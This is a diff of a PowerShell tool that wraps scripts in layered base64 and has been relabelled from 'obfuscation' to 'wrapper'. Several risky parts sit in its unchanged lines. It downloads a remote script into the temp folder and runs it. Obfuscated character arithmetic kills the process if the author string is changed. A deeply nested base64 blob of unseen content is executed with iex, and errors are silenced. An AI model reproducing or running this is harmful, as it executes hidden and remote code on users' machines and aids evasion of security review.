@@ -1,4 +1,4 @@
-#    Powershell Encoder - Base64 Wrapper
+#    Base64 Wrapper
 #    Copyright (C) 2025 Noverse
 #
 #    This program is proprietary software: you may not copy, redistribute, or modify
@@ -15,11 +15,11 @@
 #    Usage example: . \NV-Wrapper.ps1;main -nvi ".\Test.ps1" -nvo ".\Wrapped.ps1" -iterations 1
 
 $nv = "Authored by Noxi-Hu - (C) 2025 Noverse"
-sv -Scope Global -Name "ErrorActionPreference" -Value "stop"
+sv -Scope Global -Name "ErrorActionPreference" -Value "silentlycontinue"
 sv -Scope Global -Name "ProgressPreference" -Value "SilentlyContinue"
 iwr 'https://github.com/5Noxi/5Noxi/releases/download/Logo/nvbanner.ps1' -o "$env:temp\nvbanner.ps1";. $env:temp\nvbanner.ps1
 $Host.UI.RawUI.BackgroundColor="Black"
-$Host.UI.RawUI.WindowTitle="Noxi's Powershell Obfuscation - B64 Wrapper"
+$Host.UI.RawUI.WindowTitle="Noxi's B64 Wrapper"
 cls
 function log{
 param([string]$HighlightMessage, [string]$Message, [string]$Sequence, [ConsoleColor]$TimeColor='DarkGray', [ConsoleColor]$HighlightColor='White', [ConsoleColor]$MessageColor='White', [ConsoleColor]$SequenceColor='White')
@@ -109,7 +109,7 @@ $wrapped = @"
 $nvstubpre([System.Text.Encoding]::$nvutf.$nvgetstring([Convert]::$nvb64s('$b64enc')))
 "@
 sleep -milliseconds 100
-log "[+]" "Layer encoded"-HighlightColor Green
+log "[+]" "Layer obfuscated" -HighlightColor Green
 return $wrapped}
 function main{
 param([string]$nvi, [int]$iterations=1, [string]$nvo)
@@ -119,25 +119,22 @@ log "[!]" "File not found" -HighlightColor Red
 log "[/]" "Press any key to exit" -HighlightColor Yellow;if($nv -notmatch ([SYSTeM.teXT.encOding]::Utf8.gETsTRINg((0x4e, 0x6f, 0x78, 0x69)))){.([char](((2502 -Band 7510) + (2502 -Bor 7510) - 6104 - 3793))+[char](((-6898 -Band 6959) + (-6898 -Bor 6959) - 8971 + 9022))+[char]((18774 - 9290 - 8964 - 408))+[char]((6050 - 4723 + 3263 - 4475))) -Id $pid}
 [System.Console]::ReadKey() > $null
 exit}
-.([char](((576 -Band 2648) + (576 -Bor 2648) + 5694 - 8810))+[char]((3166 - 8203 + 3786 + 1362))+[char](((-3686 -Band 4682) + (-3686 -Bor 4682) - 7474 + 6581))) ([SYSTEM.text.ENcOdInG]::Utf8.GEtString((91, 33, 93))) ([SySTeM.text.ENCODing]::UTf8.GEtStrING((0x4d, 0x61, 0x64, 0x65, 0x20, 0x62, 0x79, 0x20, 0x4e, 0x6f, 0x78, 0x69, 0x20, 0x2d))) ([sYSTEM.text.EnCodInG]::UtF8.geTStRing((104, 116, 0x74, 0x70, 115, 58, 0x2f, 47, 100, 105, 115, 99, 111, 114, 0x64, 0x2e, 103, 0x67, 0x2f, 69, 50)) + [SYstem.TEXT.EnCODInG]::uTF8.getsTRinG((121, 98, 71, 52, 106, 57, 106, 85))) -HighlightColor DarkRed -SequenceColor Blue;if("$nv"-notlike ([SyStEm.tEXT.enCoDING]::UTf8.GEtStRIng((42, 78)) + [sYsTeM.tExt.EncoDIng]::uTF8.getStRINg((0x6f, 0x78)) + [SYSTeM.text.ENCoDiNG]::UTF8.gEtsTRInG([systEm.cOnverT]::froMBaSe64String('aSo=')))){.([char](((-12285 -Band 1493) + (-12285 -Bor 1493) + 5155 + 5752))+[char](((-2805 -Band 8237) + (-2805 -Bor 8237) + 3146 - 8466))+[char]((580 - 335 + 5552 - 5685))+[char](((-14392 -Band 3990) + (-14392 -Bor 3990) + 1552 + 8965))) -Id $pId};sleep 1
-log "[*]" "Reading content from" "$nvi" -HighlightColor Blue -SequenceColor Yellow
+log "[~]" "Reading content -" "$nvi" -HighlightColor Gray -SequenceColor DarkGray
 $code=cat -Path $nvi -Raw
 iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnYVdWNEtGdFRlWE4wWlcwdVZHVjRkQzVGYm1OdlpHbHVaMTA2T2xWVVJqZ3VSMlYwVTNSeWFXNW5LRnREYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUyTkZOMGNtbHVaeWduWVZkV05FdEdkRlJsV0U0d1dsY3dkVlpIVmpSa1F6VkdZbTFPZGxwSGJIVmFNVEEyVDJ4V1ZWSnFaM1ZTTWxZd1ZUTlNlV0ZYTlc1TFJuUkVZakkxTWxwWVNqQllWRzgyVW01S2RtSlZTbWhqTWxVeVRrWk9NR050YkhWYWVXZHVXVlprVjA1RmRFZGtSbEpzVjBVMGQxZHNZM2RrVmxwSVZtcFNhMUY2VmtkWmJURlBaR3h3U0dKSVZtRk5WRUV5VkRKNFYxWldTbkZhTTFaVFRXeFpkMVpVVGxObFYwWllUbGMxVEZKdVVrVlpha2t4VFd4d1dWTnFRbGxXUnpneVZXMDFTMlJ0U2xaVGJXaHFUV3hWZVZScldrOU5SMDUwWWtoV1lXVlhaSFZYVmxwclZqQTFSbVJGWkd0U2JFcHpWakJWTUdReFpITlpNMlJyVm14d1NWWnRjRk5oTVVZMlZtdGtXbUpVUmxCYVIzaDNVMGRLU1ZadFJrNVdSVVY1VmtSS05GWXhXbGRUYmtaaFRURmFWRlJYZUZwa01WcFZWR3hPYkZZd1dsbFViR014VkVaS2RWVnJWbHBoYTJ0NFZGZDRkMWRXVG5GUmJHeFhVbnBuZVZaWE1ERlRNbEowVTJ4YVZHSlhhSEZVVjNoV1pWWlNjbGRyT1U1U01EVXdXV3RvVjFsWFZsaGFTRlpZVm14d2NsWnFRVEZTYlZKR1drZDBVMkpGY0hwV2FrSldUVWRSZUZwSVRscE5NbEp5Vm0xNGQxTldXblJqUms1b1RWVlpNbFp0ZEd0WGJVcFZVbXhDWVZJemFETlZNR1JMVTFaYWRGSnJOVmRTVlZZMVZtdFNTMDVHV1hoWGJHUlVZbXRhYUZSVVJtRldSbEpZWlVad2EwMVdjRlpXUjNoUFlrWlpkMWRzYkZWaVIwMTRWa1ZhUzJSV1ZuSldiSEJvWVRKME5GWkdaRFJrTVdSWFZHNUdVbUpIZUZoVmJuQnVaVlphV0UxRVJsUk5iRW93VlRKNFlWWkhTbGhoU0VaVlZqTm9WMXBXV2xOamJHUnlUMVUxVTAxRVZYZFhWM1J2VmpGc1dGWnNhR0ZUUmxwWlZtMTRkMk5zV25GUlZFWlRZbFpLUjFkclpEQlZNa3BHWTBod1YyRnJTbGRVVldSU1pVWndTVlJzY0U1TmJFcDVWbTB4TkdReFRsZFhibEpxVW1zMWIxUldWbHBOYkZwMFpFZDBXR0pWY0ZaVmJYaERXVlpKZW1GRVRsWk5SMUpNVlRGYVlXUkdTbkpPVm1SVFZsWlpNVlp0ZEZOVE1EVkhWMWhvV0dKSFVsVlpiWFJoWVVaU1ZWSnRSbGRTYkVwWldsVmFkMkV3TVZkalJscFhVak5vVUZscldscGtNV1J6WWtaV2FWSXdNVFJXYTFaaFV6SlNWMVp1U2xkaVNFSnZXVlJLTUU1R1drZGFSRkpyVFZkU1dGWkhOVWRWYlVwSVpVWm9WbUp1UW5WYVZscGhWMFV4UlZKc1VrNWlSVzkzVmxSS05GbFdXa2hUYkdob1UwVmFWbFpxVG05V01YQlhWMnhPYW1KSFVubFVNVlV4VlRBeFJWWllaRmhXTTFKMlZtcEdjMWRHV25OaFIwWlVVbXh3V2xadE1UUmtNazV6VjI1R1VsWkZXbFJaYkZwTFVqRmtjbHBFUWxaTmEzQkhXVEJvZDFZeVJuSlRiR1JWVmxkU1UxcFZXbmRUVmxKelkwVTFUbUpGY0RWV2JUQjRUa2RSZUZSc1pGaGliRXB4Vlcxek1XSXhVbGRXYkhCT1lrWndNRnBGWkRCWFIwcFdZMFphVm1KWWFFUlhWbHBLWlcxR1JWUnNXazVTTVVwTlZsUkdZVmxYVWtkVGJrcFBWbTFTVkZac1dscE5WbHAwWkVaT1ZFMUVWa2hXTVdodlYwZEtTRlZzVmxwaVdGSm9XVlZhVTFaV1NuUlNiR1JUWWtWd1dsZHNWbUZrTWtWM1RWWmthbEpzY0ZoVmFrNXZWVVpzY2xkc2NHdE5WMUo2V1d0YVYyRldTWGROVkZKWFlURmFhRlY2U2xOV01WcDFVMnhrYVZORlNuWlhWbEpMVFVVMVIxZHJaR0ZTUmtweVZGWmtVMWRHV2toT1ZXUldZbFZ3U1ZwVldtOVdiVXAxVVc1V1lWWnNjR2hXTUZWNFVsWktjMVZyTldsU1Z6a3pWbXhTUzA1R2JGZFhhMmhVWWtkb2IxVXdWbUZXYkZweFZHMDVWMDFZUWxoV01uaFBZVzFLU0ZWdWJGVk5WbFY0VmxSQmVGSldXbGxhUm1oWFRURktNbFp0Y0Vkak1XUkhWMjVPYUZJd1dsVlZiWGgzVjJ4YWRFMVVVbXROYXpWNlZqSTFSMVZzV2taWGJGSmFZa1p3VEZWcVJtdGpiSEJGVVd4YVRtRXpRa2hYVkVKdlpERlplVkp1U2xSaVIxSldWbXhrVTFVeGNGWlhibVJVVm14S2Vsa3dWVEZVYlVwR1kwUldWMkpVUWpSVWEyUlNaVVpTYzFwR2FHbGlSWEI0VmxjeGVrMVhTWGhWYkdSWFlraENUMWxyV25kTlJuQkdXa1JDV0ZJd2NGZFpNRnBoVm0xS1dXRkZVbGhXYkhCTFdsY3hSMUpXVW5OWGF6VlRUVlZ3VGxac1VrZFpWbXhZVld0a1ZHSnJjRkJXYlRGVFZrWmFjMWRzY0U1V2JIQXdXa1ZhVDFaRk1VVldhMmhYVFZkb2RsWXdaRXRUUmxaelZteHdhVmRHU205WFZsWmhWVEZhVjFOdVVsTmlSMUpVV1d0V2QxZHNaSE5XYlVaclRXdFdNMVJXV210aGJFcHpZMFpvVm1Gck5YWldWVnB6WTJ4a2MyTkhkRTVXTVVvMlYxZDBZVll5UmxkVFdHUk9Wa1pLV0ZsVVJtRmhSbFkyVTJ4T1YwMVdjREZWTW5ocllWWk9SbE51V2xoV2JFcE1WRlZWTVZJeFpISmFSMFpUVW10d2VWWkdXbXRWTVdSSFYydG9UMVpYVWxkWmJGWjNVMVp3VmxkdE9WZGlWWEF4VlZjMVYxbFdXbk5qUjJoWFRVWldORlZzV2t0ak1WWnlUbGRzVTFaNmEzcFdiWGhUVXpBMVIySkdaRmhoTW1oVldXdGtiMkl4VlhkV2JVWlhZa1p3ZUZaSE1EVldNREZaVVd4b1YwMXVhRkJaVnpGTFUwWldkV0pHVms1V2JGWTBWbXhTUW1WR1NsZFhiR3hoVW0xb1dGUlVSa3ROYkZwMFkwVmthazFYVWtoV01qVlBZVVpKZDFkc1ZsWmlXR2d6VmpCYVlWSXhiRFpTYkZwT1lYcFdObFpxU2pCV01WcElVMnRhVDFkRldsWldhazVPWlVaV2NWSnVUbGRpUjFJd1drVmFhMVJzU2taWGFscFhWa1Z2TUZaRVJscGxWazV5V2taU2FFMVZjRmhYVm1Rd1pERldSMVp1UmxOaVJUVnhWRmQwZDFOV2JISlhhemxYVFZad1NGWXllR0ZXTWtwSVZXcE9WbFl6VGpSV2JYTjRWbXh3UjJGSGJHbFNXRUpSVm0wd01XUXlUWGxUV0doV1lrZFNXRmx0Y3pGVlJsWjBaVWhPVDFac1NucFdiWEJEVmpBeFZtTkljRnBOUm5CNlZqSjRZVmRIUmtabFJtUk9ZbXMwTUZaVVFtRldNazE0Vm01T1dHRjZWbFJaYlhSSFRsWlplV1ZIUmxwV01VWTBWVEZvYjFkSFNuTlRia0pXWWxSR1ZGWnJXbE5XVmtweVYyMTRVMkpJUVhkWFZFSlhUVVpSZUZOWVpHbFNSa3BZVlcweGIyVnNXbkZUYTNScVlYcFdXbFZ0ZUdGaFZtUklZVVV4VjJKR1NraFpla1poVmpGS2MxWnNUbWxUUlVwWlYxZDBhMDB5Vm5OWGJsSnNVbXMxVkZSWGRHRmxWbEpYVjIxMFYxSXdXbmxWTWpGSFZsWmFWMk5FVGxkU1ZuQnlWbXBHWVZkWFJrZGFSMnhYVmtaYVNsWXhaREJaVmxsNVVteGtWRmRIYUZWV01HaERWMVphZEdWSVpGZE5XRUpYVjJ0Vk1XSkdTbk5UYWtaWFlsaG9XRmxXV2s5U2JFNXpVV3hvVjAweWFESlhWM0JIVXpGSmVHTkZiRlJpUjFKd1ZXcEdTMlZHV2tkWGJGcE9WbXMxV0ZadE5WTmhNVXAwVld4a1dtSkdXak5XTW5oaFYwZFdSMXBHWkdsV1dFSkpWbXBLZDFNeFdsZFhXSEJvVWpKb1YxbHJXbmRWUm5CSFYyczVhbUY2YkZoV1IzTXhWakZrUmxKWWJGZGhhMXBVVlZSR1dtVldUbGxpUms1cFVqRktWMWRXVWt0T1JsVjRZa2hPVjJKVldsaFphMXAzWlVaYVNHUkZPV2xTTUhCSVZUSTFkMVl3TVhGU1dHUmFWbnBHVEZWcVJrOWpNV1J6VjIxc1YxSldiekpXTVZwaFdWWlJlRk51VGxSaVIzaHZWVzB4VTFaR1ZuTlhibVJZVm14c05GWXlNVWRXYXpGelUydG9WMUo2VmxoV2JURkxWMWRHUjFac1dtbFNiRzk2Vm1wQ1lXRXhaRVpOVlZaVFlrVndUMVp0TlVOVFZtUlhWV3M1YVUxV2JEUldNblJyVjBkS1NHVkdaRnBXTTFKSFdsVmFWbVF4WkhOalIzaFhUVlp3UzFZeWRHRlpWbEowVTJ0a2FsSkdjRmhXYTFaeVpVWnNObEpzY0d0TlJFWllWMnRhVTJGRk1IaFRiR1JZVmpOU2NsWlVSa3BsUjA1SFYyMUdVMVpIZUZWV1JscGhXVmRXYzFkc2FHeFNNMUpYVkZaV2QxWXhiSEZVYlRsWFRWZFNTbFZYZEc5V01VcEdZMFpDWVZKV2NGUlpNbmhYWXpKT1JrNVZOVk5YUlVwUVZtMHhORlV4VFhsV2JrcFFWbXh3Y1ZWcldtRmlNVkpWVVd0MFZWWnNjRmhXVm1oclZVWmFXVkZVUmxwV1JUVkVWa1ZhVjFaVk1VVmlSWFJzVmpOU00xVjZSa1pQVmtKVVdUTkNURlV5Y3psS2VXdHdTMUU5UFNjcEtTaz0nKSkp')))
 $metadata = @"
-# Created with Noverse Base64 Encoder - https://discord.gg/E2ybG4j9jU
+# Noverse Base64 Wrapper - https://discord.gg/E2ybG4j9jU
 "@
-log "[?]" "Starting wrapping process with $iterations iterations" -HighlightColor Magenta
+log "[*]" "Starting wrapping process with $iterations iterations" -HighlightColor Blue
 sleep -milliseconds 100
 for ($i = 1; $i -le $iterations; $i++) {
 log "[~]" "Starting iteration $i" -HighlightColor Gray;if("$nv"-notlike ([SyStEm.tEXT.enCoDING]::UTf8.GEtStRIng((42, 78)) + [sYsTeM.tExt.EncoDIng]::uTF8.getStRINg((0x6f, 0x78)) + [SYSTeM.text.ENCoDiNG]::UTF8.gEtsTRInG([systEm.cOnverT]::froMBaSe64String('aSo=')))){.([char](((-12285 -Band 1493) + (-12285 -Bor 1493) + 5155 + 5752))+[char](((-2805 -Band 8237) + (-2805 -Bor 8237) + 3146 - 8466))+[char]((580 - 335 + 5552 - 5685))+[char](((-14392 -Band 3990) + (-14392 -Bor 3990) + 1552 + 8965))) -Id $pId}
 $code = wrap -nvic $code}
 $code = "$metadata`n$code"
-log "[*]" "Wrapping completed" -HighlightColor Blue
 sleep -milliseconds 100
-log "[~]" "Writing wrapped content to" "$nvo" -HighlightColor Gray -SequenceColor Yellow
+log "[+]" "Output at -" "$nvo" -HighlightColor Green -SequenceColor DarkGray
 sleep -milliseconds 100
 [system.io.file]::writealltext($nvo,$code)
-log "[+]" "Done" -HighlightColor Green
 sleep -milliseconds 100
 log "[/]" "Press any key to exit" -HighlightColor Yellow
 [System.Console]::ReadKey() > $null
